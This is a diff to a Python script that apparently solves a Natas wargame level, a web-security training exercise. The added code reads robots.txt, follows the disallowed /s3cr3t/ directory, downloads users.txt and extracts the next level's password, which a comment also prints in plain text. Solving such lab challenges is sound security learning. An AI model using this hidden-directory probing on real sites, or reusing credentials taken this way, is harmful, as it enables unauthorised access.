@@ -14,4 +14,28 @@ response = requests.get(url=URL, auth=AUTH)
 soup = bs4.BeautifulSoup(response.text, 'html.parser')
 body = soup.find('body')
 div_content = body.find('div', {'id' : 'content'})
-print(div_content)
+print(f'{div_content}\n')
+
+
+# reference: https://support.google.com/webmasters/answer/6062608?hl=en
+# the comment indicates the existence of robots.txt
+# it says that even the google's crawler won't be able to find the password
+response = requests.get(url=URL + '/robots.txt', auth=AUTH)
+print(f'{response.text}\n')
+
+
+# in robots.txt, we find /s3cr3t/ directory
+s3cr3t = re.search(r'Disallow: (/\w+/)', response.text).group(1)
+response = requests.get(url=URL + s3cr3t, auth=AUTH)
+print(f'{response.text}\n')
+soup = bs4.BeautifulSoup(response.text, 'html.parser')
+a = soup.find('a', {'href' : 'users.txt'})
+# in /s3cr3t directory, we find that it contains users.txt
+# here, we used .+ instead of \w+ as the file contains a dot, which is not an alphanumeric character
+users = re.search(r'>(.+)<', str(a)).group(1)
+
+
+# natas4 password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+response = requests.get(url=URL + s3cr3t + users, auth=AUTH)
+password = re.search(r'natas4:(\w+)', response.text).group(1)
+print(f'natas4 password: {password}')
